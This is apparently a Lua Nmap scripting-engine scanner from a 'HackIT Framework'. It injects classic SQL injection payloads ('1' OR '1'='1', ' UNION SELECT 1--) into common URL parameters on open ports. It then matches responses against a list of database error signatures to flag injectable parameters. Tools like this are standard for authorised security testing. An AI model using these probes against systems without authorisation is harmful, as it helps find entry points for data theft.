local http = require "http"
local stdnse = require "stdnse"

description = [[Injects common SQLi payloads into query parameters and looks for SQL error messages in the response.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"web", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" end

action = function(host, port)
    local payloads = {"'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' UNION SELECT 1--", "' OR 1=1--"}
    local error_patterns = {
        "SQL syntax.*MySQL", "Warning.*mysql_.*", "MySqli", "SQLite",
        "ORA-[0-9]{5}", "Oracle.*Driver", "PostgreSQL.*ERROR",
        "Microsoft.*ODBC", "Driver.*SQL Server", "Unclosed quotation mark",
        "You have an error in your SQL", "Syntax error in SQL",
        "Division by zero", "Unknown column", "Table.*doesn't exist"
    }
    local test_params = {"id", "page", "cat", "category", "product", "user", "pid"}
    local results = {}
    for _, param in ipairs(test_params) do
        for _, payload in ipairs(payloads) do
            local url = "/?" .. param .. "=" .. payload
            local response = http.get(host, port, url)
            if response and response.body then
                for _, pattern in ipairs(error_patterns) do
                    if response.body:find(pattern) then
                        results[#results + 1] = "SQL error via " .. param .. " with payload: " .. payload
                        break
                    end
                end
            end
            if #results >= 5 then break end
        end
        if #results >= 5 then break end
    end
    if #results == 0 then
        return stdnse.format_output(false, "No SQL error signatures detected")
    end
    return stdnse.format_output(true, table.concat(results, "\n"))
end
